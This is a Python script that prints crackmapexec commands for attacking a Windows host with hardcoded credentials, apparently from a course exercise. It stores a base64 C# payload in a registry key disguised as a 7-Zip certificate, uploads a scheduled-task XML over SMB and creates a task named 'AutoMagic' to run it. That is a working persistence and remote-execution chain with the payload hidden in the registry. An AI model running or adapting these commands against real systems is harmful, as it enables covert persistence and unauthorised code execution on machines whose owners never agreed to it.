#!/usr/bin/python3

username="brailee.ogden"
password="Winter2022"
winIP="172.26.9.209"
regKey="HKLM\\Software\\7-Zip\\Certificate"

print("\n\nDelete the registry key if it exists: ")
# crackmapexec smb -u brailee.ogden -p Winter2022 -x "reg delete HKLM\7-zip\Certificate /va /f" 172.26.12.225
a = (f'crackmapexec smb -u {username} -p {password} -x "reg delete {regKey} /va /f" {winIP}')
print(a)

print("\n\nCreate the Registry Key: ")
# Read the b64 file
b64 = open('csharp.b64').readline()
#print(b64)
# crackmapexec smb -u brailee.ogden -p Winter2022 -x "reg add HKLM\Software\7-zip\Certificate /VE /D <b64> /F" 172.26.12.225
b = (f'crackmapexec smb -u {username} -p {password} -x "reg add {regKey} /VE /D {b64} /F" {winIP}')
print(b)

print("\n\nTransfer XML File to Windows Host: ")
# crackmapexec smb -u brailee.ogden -p Winter2022 --put-file /home/thepcn3rd/ensign/IT420/Blue/sched.xml \\users\\public\\s.xml 172.26.9.209
#path = "/home/thepcn3rd/ensign/IT420/Blue/sched.xml"
path = "/work/ensign2023/Blue/sched.xml"
c = (f'crackmapexec smb -u {username} -p {password} --put-file {path} \\\\users\\\\public\\\\s.xml {winIP}')
print(c)

print("\n\nCreate Scheduled Task: ")
# crackmapexec smb -u brailee.ogden -p Winter2022 -x "schtasks.exe /create /ru brailee.ogden /rp Winter2022 /tn AutoMagic /XML c:\users\public\s.xml
d = (f'crackmapexec smb -u {username} -p {password} -x "schtasks.exe /create /ru brailee.ogden /rp Winter2022 /tn AutoMagic /XML c:\\users\\public\\s.xml" {winIP}')
print(d) 
